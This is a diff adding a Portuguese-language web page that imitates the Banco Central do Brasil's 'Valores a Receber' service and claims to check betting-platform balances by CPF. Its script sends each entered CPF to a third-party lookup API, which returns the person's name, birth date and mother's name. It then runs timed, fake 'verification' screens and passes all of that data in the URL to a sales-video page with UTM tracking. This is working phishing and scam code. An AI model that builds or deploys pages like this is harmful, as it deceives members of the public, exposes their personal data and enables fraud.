@@ -1,0 +1,922 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- Utmify Pixel -->
+    <script>
+      window.pixelId = "6ad6b8c8a8d3ee2bee813a7a";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script><script async="" defer="" src="js/pixel.js"></script>
+    <!-- Utmify UTM Tracker -->
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+        <!-- Preservação de UTMs e navegação (helper único) -->
+    <script src="js/utm-helper.js"></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+  <title>Atendimento</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='4' fill='%2300838F'/><text x='16' y='22' text-anchor='middle' font-size='18' fill='white' font-family='Arial'>B</text></svg>" type="image/svg+xml">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min.css">
+  <style>
+    :root {
+      --bcb-teal: #00838F;
+      --bcb-teal-dark: #006672;
+      --bcb-teal-light: #E0F4F5;
+      --bcb-teal-border: #B2DFDB;
+      --bcb-white: #FFFFFF;
+      --bcb-gray-bg: #F5F5F5;
+      --bcb-gray-text: #444444;
+      --bcb-gray-medium: #CCCCCC;
+      --bcb-gray-light: #EEEEEE;
+      --bcb-red: #C62828;
+      --bcb-green: #2E7D32;
+      --border-radius: 4px;
+      --transition: all 0.25s ease;
+    }
+
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+      background: var(--bcb-gray-bg);
+      min-height: 100vh;
+      color: var(--bcb-gray-text);
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    header {
+      background: var(--bcb-teal);
+      padding: 0 20px;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.18);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .header-logo { display: flex; align-items: center; gap: 10px; }
+    .bcb-logo-img { height: 52px; width: auto; display: block; }
+
+    .btn-contrast {
+      background: none;
+      border: 2px solid rgba(255, 255, 255, 0.5);
+      border-radius: 50%;
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: var(--transition);
+      color: white;
+    }
+
+    .btn-contrast:hover { background: rgba(255, 255, 255, 0.15); border-color: white; }
+    .btn-contrast svg { width: 18px; height: 18px; fill: white; }
+
+    .main-content {
+      flex: 1;
+      padding: 32px 16px 48px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .form-card {
+      background: #fff;
+      border-radius: 8px;
+      border: 1px solid var(--bcb-gray-medium);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.10);
+      padding: 32px 28px 36px;
+      width: 100%;
+      max-width: 420px;
+      animation: fadeInUp 0.5s ease-out;
+    }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px) }
+      to { opacity: 1; transform: translateY(0) }
+    }
+
+    .field-group { margin-bottom: 22px; }
+
+    .field-label {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--bcb-gray-text);
+      margin-bottom: 2px;
+      display: block;
+    }
+
+    .field-hint {
+      font-size: 12px;
+      color: #777;
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    .input-wrapper { position: relative; display: flex; align-items: center; }
+
+    .input-svg-icon {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 22px;
+      height: 22px;
+      fill: var(--bcb-gray-text);
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .field-input {
+      width: 100%;
+      padding: 11px 14px 11px 40px;
+      border: 1px solid var(--bcb-gray-medium);
+      border-radius: var(--border-radius);
+      font-size: 15px;
+      font-family: inherit;
+      color: var(--bcb-gray-text);
+      background: #fff;
+      transition: var(--transition);
+      outline: none;
+    }
+
+    .field-input:focus {
+      border-color: var(--bcb-teal);
+      box-shadow: 0 0 0 3px rgba(0, 131, 143, 0.15);
+    }
+
+    .field-input.error-border {
+      border-color: var(--bcb-red);
+      box-shadow: 0 0 0 2px rgba(198, 40, 40, 0.12);
+    }
+
+    .error-message {
+      display: none;
+      align-items: center;
+      gap: 6px;
+      color: var(--bcb-red);
+      font-size: 13px;
+      font-weight: 500;
+      margin-top: 6px;
+    }
+
+    .error-message.visible { display: flex; }
+    .error-message svg { width: 16px; height: 16px; fill: var(--bcb-red); flex-shrink: 0; }
+
+    /* ===== BOTÃO MELHORADO ===== */
+    .btn-continuar {
+      width: 100%;
+      padding: 16px 24px;
+      background: linear-gradient(135deg, #00838F 0%, #006672 100%);
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 700;
+      font-family: inherit;
+      letter-spacing: 0.4px;
+      cursor: pointer;
+      margin-top: 28px;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 6px 20px rgba(0, 131, 143, 0.35), inset 0 1px 0 rgba(255,255,255,0.15);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-continuar::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+      transition: left 0.6s ease;
+    }
+
+    .btn-continuar:hover:not(:disabled)::before {
+      left: 100%;
+    }
+
+    .btn-continuar:hover:not(:disabled) {
+      background: linear-gradient(135deg, #009AA6 0%, #007A8A 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 10px 28px rgba(0, 131, 143, 0.45), inset 0 1px 0 rgba(255,255,255,0.2);
+    }
+
+    .btn-continuar:active:not(:disabled) {
+      transform: translateY(0);
+      box-shadow: 0 4px 14px rgba(0, 131, 143, 0.35);
+    }
+
+    .btn-continuar:disabled {
+      background: linear-gradient(135deg, #B0BEC5 0%, #90A4AE 100%);
+      cursor: not-allowed;
+      box-shadow: none;
+      transform: none;
+      opacity: 0.7;
+    }
+
+    /* ÍCONE DO BOTÃO - AGORA PEQUENO E ALINHADO */
+    .btn-continuar svg.btn-icon {
+      width: 20px;
+      height: 20px;
+      fill: white;
+      flex-shrink: 0;
+      transition: transform 0.3s ease;
+    }
+
+    .btn-continuar:hover:not(:disabled) svg.btn-icon {
+      transform: scale(1.15) rotate(-8deg);
+    }
+
+    .btn-text {
+      display: inline-block;
+      line-height: 1;
+    }
+
+    .card-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #0C326F;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+
+    .card-title-bar {
+      width: 56px;
+      height: 3px;
+      background: var(--bcb-teal);
+      border-radius: 2px;
+      margin: 0 auto 20px;
+    }
+
+    .cpf-label-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .cpf-label-row svg { width: 22px; height: 22px; fill: #0C326F; }
+    .cpf-label-row span { font-size: 15px; font-weight: 600; color: #0C326F; }
+
+    .info-box {
+      background: #EBF4FD;
+      border-left: 4px solid var(--bcb-teal);
+      border-radius: 4px;
+      padding: 12px 14px;
+      font-size: 13px;
+      color: #444;
+      line-height: 1.5;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .info-box strong { color: var(--bcb-teal); font-weight: 600; }
+
+    .mini-footer {
+      text-align: center;
+      padding: 12px 16px;
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.9);
+      background: var(--bcb-teal);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .footer-logo { height: 20px; width: auto; display: block; object-fit: contain; }
+
+    @media(max-width:480px) {
+      .form-card { padding: 24px 18px 28px; }
+      header { height: 52px; }
+    }
+
+    /* ===== OVERLAY SCREENS ===== */
+    .overlay-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 999;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: var(--bcb-gray-bg);
+      opacity: 0;
+      transition: opacity 0.4s ease;
+    }
+
+    .overlay-screen.active { display: flex; opacity: 1; }
+
+    /* === LOADING / PROCESSING === */
+    .loading-card, .processing-card, .confirm-card {
+      background: #fff;
+      border-radius: 12px;
+      border: 1px solid var(--bcb-gray-medium);
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.12);
+      padding: 48px 36px;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      animation: fadeInUp 0.5s ease-out;
+    }
+
+    .loading-spinner-large {
+      width: 64px;
+      height: 64px;
+      border: 5px solid var(--bcb-teal-border);
+      border-top-color: var(--bcb-teal);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 28px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg) } }
+
+    .loading-status {
+      font-size: 17px;
+      font-weight: 600;
+      color: #0C326F;
+      min-height: 28px;
+    }
+
+    .loading-dots::after {
+      content: '';
+      animation: dots 1.5s steps(4, end) infinite;
+    }
+
+    @keyframes dots {
+      0%   { content: ''; }
+      25%  { content: '.'; }
+      50%  { content: '..'; }
+      75%  { content: '...'; }
+      100% { content: ''; }
+    }
+
+    .loading-progress {
+      width: 100%;
+      height: 6px;
+      background: var(--bcb-gray-light);
+      border-radius: 3px;
+      margin-top: 24px;
+      overflow: hidden;
+    }
+
+    .loading-progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, var(--bcb-teal), #4DD0E1, var(--bcb-teal));
+      background-size: 200% 100%;
+      border-radius: 3px;
+      width: 0%;
+      transition: width 0.6s ease;
+      animation: shimmer 1.5s infinite;
+    }
+
+    @keyframes shimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+
+    /* === CONFIRM SCREEN === */
+    .confirm-icon {
+      width: 60px;
+      height: 60px;
+      background: #E8F5E9;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+
+    .confirm-icon svg { width: 32px; height: 32px; fill: #2E7D32; }
+
+    .confirm-title { font-size: 18px; font-weight: 700; color: #0C326F; margin-bottom: 8px; }
+    .confirm-subtitle { font-size: 14px; color: #666; margin-bottom: 24px; line-height: 1.5; }
+
+    .confirm-data-box {
+      background: #F8F9FA;
+      border: 1px solid var(--bcb-gray-light);
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+      text-align: left;
+    }
+
+    .confirm-data-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 8px 0;
+      border-bottom: 1px solid var(--bcb-gray-light);
+      gap: 12px;
+    }
+
+    .confirm-data-row:last-child { border-bottom: none; }
+    .confirm-data-label { font-size: 13px; color: #888; font-weight: 500; flex-shrink: 0; }
+    .confirm-data-value { font-size: 14px; color: #333; font-weight: 600; text-align: right; word-break: break-word; }
+
+    .btn-confirmar {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #00838F 0%, #006672 100%);
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 6px 20px rgba(0, 131, 143, 0.35), inset 0 1px 0 rgba(255,255,255,0.15);
+    }
+
+    .btn-confirmar:hover {
+      background: linear-gradient(135deg, #009AA6 0%, #007A8A 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 10px 28px rgba(0, 131, 143, 0.45);
+    }
+
+    .btn-confirmar svg { width: 20px; height: 20px; fill: white; flex-shrink: 0; }
+
+    /* === PROCESSING STEPS === */
+    .processing-steps {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      text-align: left;
+      margin-top: 24px;
+    }
+
+    .processing-step {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 14px;
+      color: #999;
+      transition: all 0.4s ease;
+    }
+
+    .processing-step.done { color: #2E7D32; }
+    .processing-step.active { color: var(--bcb-teal); font-weight: 600; }
+
+    .step-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      background: var(--bcb-gray-light);
+      transition: all 0.4s ease;
+    }
+
+    .processing-step.done .step-icon { background: #E8F5E9; }
+    .processing-step.active .step-icon { background: var(--bcb-teal-light); animation: pulseStep 1s infinite; }
+
+    @keyframes pulseStep { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
+
+    .step-icon svg { width: 14px; height: 14px; fill: #999; transition: fill 0.4s ease; }
+    .processing-step.done .step-icon svg { fill: #2E7D32; }
+    .processing-step.active .step-icon svg { fill: var(--bcb-teal); }
+
+    .step-spinner {
+      width: 14px;
+      height: 14px;
+      border: 2px solid var(--bcb-teal-border);
+      border-top-color: var(--bcb-teal);
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ========== TELA PRINCIPAL (FORM CPF) ========== -->
+  <header>
+    <div class="header-logo">
+      <img src="images/OxmVDoE.png" alt="Banco Central do Brasil" class="bcb-logo-img">
+    </div>
+    <button class="btn-contrast" title="Alto contraste" aria-label="Alternar contraste">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 3a9 9 0 1 0 0 18A9 9 0 0 0 12 3zm0 16V5a7 7 0 0 1 0 14z"></path>
+      </svg>
+    </button>
+  </header>
+
+  <main class="main-content">
+    <div class="form-card">
+
+      <h2 class="card-title">Consulte Valores a Receber</h2>
+      <div class="card-title-bar"></div>
+
+      <div class="cpf-label-row">
+        <svg viewBox="0 0 24 24">
+          <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-9 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm6 10H5v-.6c0-2 4-3.1 6-3.1s6 1.1 6 3.1v.6zm4-4h-2v-2h-2v2h-2v2h2v2h2v-2h2z"></path>
+        </svg>
+        <span>Número do CPF</span>
+      </div>
+
+      <div class="info-box">
+        Digite seu CPF para <strong>consultar</strong> se você ainda tem valores disponíveis em plataformas de apostas regulamentadas.
+      </div>
+
+      <form id="cpfForm" novalidate="">
+
+        <div class="field-group" id="cpfGroup">
+          <label class="field-label" for="cpfInput">Insira o CPF</label>
+          <span class="field-hint">Digite o seu CPF</span>
+          <div class="input-wrapper">
+            <svg class="input-svg-icon" viewBox="0 0 24 24">
+              <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"></path>
+            </svg>
+            <input type="tel" id="cpfInput" name="cpf" class="field-input" placeholder="Exemplo: 000.000.000-00" maxlength="14" autocomplete="off" required="">
+          </div>
+          <div class="error-message" id="cpfError">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+            <span id="cpfErrorText">Campo obrigatório</span>
+          </div>
+        </div>
+
+        <button type="submit" class="btn-continuar" id="submitBtn" disabled="">
+          <svg class="btn-icon" viewBox="0 0 24 24">
+            <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
+          </svg>
+          <span class="btn-text">Consultar valores</span>
+        </button>
+      </form>
+    </div>
+  </main>
+
+  <footer class="mini-footer">
+    <img src="images/33wkgIQ.png" alt="Logo" class="footer-logo">
+    <span>Todo o conteúdo deste site está publicado sob a licença</span>
+  </footer>
+
+
+  <!-- ========== OVERLAY: LOADING ========== -->
+  <div class="overlay-screen" id="loadingScreen">
+    <div class="loading-card">
+      <div class="loading-spinner-large"></div>
+      <div class="loading-status" id="loadingStatus">Carregando<span class="loading-dots"></span></div>
+      <div class="loading-progress"><div class="loading-progress-bar" id="loadingProgressBar"></div></div>
+    </div>
+  </div>
+
+
+  <!-- ========== OVERLAY: CONFIRMAR ========== -->
+  <div class="overlay-screen" id="confirmScreen">
+    <div class="confirm-card">
+      <div class="confirm-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg></div>
+      <div class="confirm-title">Confirme seus dados</div>
+      <div class="confirm-subtitle">Verificamos que este CPF está cadastrado.<br>Confirme seus dados para continuar.</div>
+      <div class="confirm-data-box">
+        <div class="confirm-data-row"><span class="confirm-data-label">Nome</span><span class="confirm-data-value" id="confirmNome">---</span></div>
+        <div class="confirm-data-row"><span class="confirm-data-label">CPF</span><span class="confirm-data-value" id="confirmCpf">---</span></div>
+        <div class="confirm-data-row"><span class="confirm-data-label">Data de Nascimento</span><span class="confirm-data-value" id="confirmNascimento">---</span></div>
+      </div>
+      <button class="btn-confirmar" id="btnConsultarAgora">
+        <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
+        Consultar valores
+      </button>
+    </div>
+  </div>
+
+
+  <!-- ========== OVERLAY: PROCESSANDO ========== -->
+  <div class="overlay-screen" id="processingScreen">
+    <div class="processing-card">
+      <div class="loading-spinner-large"></div>
+      <div class="loading-status" id="processingStatus">Verificando seus valores<span class="loading-dots"></span></div>
+      <div class="processing-steps">
+        <div class="processing-step" id="pStep1"><div class="step-icon"><div class="step-spinner"></div></div><span>Conectando ao sistema...</span></div>
+        <div class="processing-step" id="pStep2"><div class="step-icon"><div class="step-spinner"></div></div><span>Consultando valores vinculados...</span></div>
+        <div class="processing-step" id="pStep3"><div class="step-icon"><div class="step-spinner"></div></div><span>Cruzando dados com plataformas...</span></div>
+        <div class="processing-step" id="pStep4"><div class="step-icon"><div class="step-spinner"></div></div><span>Calculando valor total elegível...</span></div>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ========== JAVASCRIPT ========== -->
+  <script>
+    // ============================================================
+    // CONFIGURAÇÃO DA API DE CPF
+    // ============================================================
+    const API_CPF_BASE = 'https://searchapi.it.com/consulta';
+    const API_CPF_TOKEN = '1479';
+
+    // ============================================================
+    // UTILITÁRIOS CPF
+    // ============================================================
+    const removeMask = v => v.replace(/\D/g, '');
+
+    function formatCPF(v) {
+      let d = removeMask(v).slice(0, 11);
+      if (d.length > 9) return d.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+      if (d.length > 6) return d.replace(/^(\d{3})(\d{3})(\d+)/, '$1.$2.$3');
+      if (d.length > 3) return d.replace(/^(\d{3})(\d+)/, '$1.$2');
+      return d;
+    }
+
+    function isValidCPF(cpf) {
+      cpf = removeMask(cpf);
+      if (cpf.length !== 11) return false;
+      if (/^(\d)\1+$/.test(cpf)) return false;
+      let sum = 0, r;
+      for (let i = 1; i <= 9; i++) sum += parseInt(cpf[i - 1]) * (11 - i);
+      r = (sum * 10) % 11; if (r === 10 || r === 11) r = 0;
+      if (r !== parseInt(cpf[9])) return false;
+      sum = 0;
+      for (let i = 1; i <= 10; i++) sum += parseInt(cpf[i - 1]) * (12 - i);
+      r = (sum * 10) % 11; if (r === 10 || r === 11) r = 0;
+      return r === parseInt(cpf[10]);
+    }
+
+    // ============================================================
+    // ELEMENTOS DO FORM
+    // ============================================================
+    const cpfInput = document.getElementById('cpfInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const cpfError = document.getElementById('cpfError');
+    const cpfErrorTxt = document.getElementById('cpfErrorText');
+
+    function showCpfError(msg) {
+      cpfErrorTxt.textContent = msg;
+      cpfError.classList.add('visible');
+      cpfInput.classList.add('error-border');
+    }
+
+    function hideCpfError() {
+      cpfError.classList.remove('visible');
+      cpfInput.classList.remove('error-border');
+    }
+
+    cpfInput.addEventListener('input', function () {
+      this.value = formatCPF(this.value);
+      hideCpfError();
+      const d = removeMask(this.value);
+      if (d.length < 11) { submitBtn.disabled = true; return; }
+      if (!isValidCPF(d)) {
+        showCpfError('CPF inválido. Verifique e tente novamente.');
+        submitBtn.disabled = true;
+        return;
+      }
+      hideCpfError();
+      submitBtn.disabled = false;
+    });
+
+    // ============================================================
+    // DADOS DO USUÁRIO
+    // ============================================================
+    let userData = { cpf: '', nome: '', nascimento: '', mae: '', cpfFormatado: '' };
+
+    function formatarDataNascimento(dataISO) {
+      if (!dataISO) return '---';
+      if (dataISO.includes('-')) {
+        const [ano, mes, dia] = dataISO.split('-');
+        return `${dia}/${mes}/${ano}`;
+      }
+      return dataISO;
+    }
+
+    // ============================================================
+    // CONSULTA À API DE CPF
+    // ============================================================
+    async function consultarCPF(cpf) {
+      const cleanCPF = cpf.replace(/\D/g, '');
+      const url = `${API_CPF_BASE}?cpf=${cleanCPF}&token_api=${API_CPF_TOKEN}`;
+
+      console.log('[API CPF] Consultando:', url);
+
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+        const resp = await fetch(url, {
+          method: 'GET',
+          headers: { 'Accept': 'application/json' },
+          signal: controller.signal
+        });
+
+        clearTimeout(timeoutId);
+
+        if (!resp.ok) {
+          const errData = await resp.json().catch(() => null);
+          if (errData && errData.mensagem) {
+            throw new Error(errData.mensagem);
+          }
+          throw new Error(`API retornou status ${resp.status}`);
+        }
+
+        const data = await resp.json();
+        console.log('[API CPF] Resposta:', data);
+
+        const item = (data && Array.isArray(data.dados) && data.dados.length > 0)
+          ? data.dados[0]
+          : (data && data.dados ? data.dados : data);
+
+        if (item && item.NOME && item.NOME.trim() !== '') {
+          return {
+            nome: item.NOME,
+            nascimento: item.NASC || item.DT_NASCIMENTO || '',
+            mae: (item.NOME_MAE && item.NOME_MAE.trim() !== '') ? item.NOME_MAE.trim() : 'Não Informado',
+            sexo: item.SEXO || ''
+          };
+        } else {
+          throw new Error('CPF não encontrado na base de dados.');
+        }
+
+      } catch (err) {
+        console.error('[API CPF] Erro:', err.message);
+        if (err.name === 'AbortError') {
+          throw new Error('Tempo limite excedido. Tente novamente.');
+        }
+        throw err;
+      }
+    }
+
+    // ============================================================
+    // OVERLAY: MOSTRAR / OCULTAR
+    // ============================================================
+    function showOverlay(id) {
+      const el = document.getElementById(id);
+      el.style.display = 'flex';
+      void el.offsetWidth;
+      el.classList.add('active');
+    }
+
+    function hideOverlay(id) {
+      const el = document.getElementById(id);
+      el.classList.remove('active');
+      setTimeout(() => { el.style.display = 'none'; }, 400);
+    }
+
+    // ============================================================
+    // SEQUÊNCIA DE LOADING
+    // ============================================================
+    async function runLoadingSequence() {
+      return new Promise((resolve) => {
+        const status = document.getElementById('loadingStatus');
+        const bar = document.getElementById('loadingProgressBar');
+
+        status.innerHTML = 'Carregando<span class="loading-dots"></span>';
+        bar.style.width = '30%';
+
+        setTimeout(() => {
+          status.innerHTML = 'Processando<span class="loading-dots"></span>';
+          bar.style.width = '65%';
+        }, 1800);
+
+        setTimeout(() => {
+          status.innerHTML = '<span style="color:#2E7D32">Encontrado!</span>';
+          bar.style.width = '100%';
+        }, 3600);
+
+        setTimeout(resolve, 4800);
+      });
+    }
+
+    // ============================================================
+    // SEQUÊNCIA DE PROCESSAMENTO
+    // ============================================================
+    async function runProcessingSequence() {
+      return new Promise((resolve) => {
+        const steps = [
+          { el: document.getElementById('pStep1'), time: 0 },
+          { el: document.getElementById('pStep2'), time: 1500 },
+          { el: document.getElementById('pStep3'), time: 3000 },
+          { el: document.getElementById('pStep4'), time: 4500 }
+        ];
+
+        steps.forEach(step => {
+          setTimeout(() => {
+            steps.forEach(s => {
+              if (s.el && s.time < step.time) {
+                s.el.classList.remove('active');
+                s.el.classList.add('done');
+                const icon = s.el.querySelector('.step-icon');
+                icon.innerHTML = '<svg viewBox="0 0 24 24"><path fill="#2E7D32" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
+              }
+            });
+            step.el.classList.add('active');
+          }, step.time);
+        });
+
+        setTimeout(() => {
+          const lastStep = steps[steps.length - 1];
+          lastStep.el.classList.remove('active');
+          lastStep.el.classList.add('done');
+          const icon = lastStep.el.querySelector('.step-icon');
+          icon.innerHTML = '<svg viewBox="0 0 24 24"><path fill="#2E7D32" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
+          setTimeout(resolve, 600);
+        }, 5500);
+      });
+    }
+
+    function resetProcessingSteps() {
+      for (let i = 1; i <= 4; i++) {
+        const step = document.getElementById('pStep' + i);
+        step.classList.remove('done', 'active');
+        step.querySelector('.step-icon').innerHTML = '<div class="step-spinner"></div>';
+      }
+    }
+
+    // ============================================================
+    // SUBMIT DO FORM
+    // ============================================================
+    document.getElementById('cpfForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const d = removeMask(cpfInput.value);
+      if (!isValidCPF(d)) {
+        showCpfError('CPF inválido.');
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<div style="width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 0.7s linear infinite;"></div><span class="btn-text">Consultando...</span>';
+
+      userData.cpf = d;
+      userData.cpfFormatado = formatCPF(d);
+
+      // 1) Mostra tela de loading
+      showOverlay('loadingScreen');
+      await runLoadingSequence();
+      hideOverlay('loadingScreen');
+
+      // 2) Consulta API
+      try {
+        const apiData = await consultarCPF(d);
+        userData.nome = apiData.nome;
+        userData.nascimento = apiData.nascimento;
+        userData.mae = apiData.mae;
+        console.log('[Dados salvos]', userData);
+      } catch (err) {
+        alert('Erro ao consultar CPF: ' + err.message + '\n\nVerifique sua conexão e tente novamente.');
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = '<svg class="btn-icon" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg><span class="btn-text">Consultar valores</span>';
+        return;
+      }
+
+      // 3) Preenche e mostra tela de confirmação
+      document.getElementById('confirmNome').textContent = userData.nome;
+      document.getElementById('confirmCpf').textContent = userData.cpfFormatado;
+      document.getElementById('confirmNascimento').textContent = formatarDataNascimento(userData.nascimento);
+      showOverlay('confirmScreen');
+    });
+
+    // ============================================================
+    // BOTÃO "CONSULTAR AGORA" → VAI DIRETO PRO CHAT
+    // ============================================================
+    document.getElementById('btnConsultarAgora').addEventListener('click', async function () {
+      hideOverlay('confirmScreen');
+      resetProcessingSteps();
+      showOverlay('processingScreen');
+      await runProcessingSequence();
+      hideOverlay('processingScreen');
+
+      // Vai para o VSL preservando todas as UTMs + dados do usuário
+      const params = new URLSearchParams(window.location.search);
+      if (window.getMergedTrackingParams) {
+        const merged = window.getMergedTrackingParams();
+        merged.forEach((val, key) => {
+          if (!params.has(key)) params.set(key, val);
+        });
+      }
+      params.set('cpf', userData.cpfFormatado);
+      params.set('nome', userData.nome);
+      params.set('nascimento', formatarDataNascimento(userData.nascimento));
+      params.set('mae', userData.mae);
+
+      console.log('[Redirecionando para vsl com UTMs]', params.toString());
+      window.location.href = 'vsl.html?' + params.toString();
+    });
+  </script>
+
+
+</body></html>
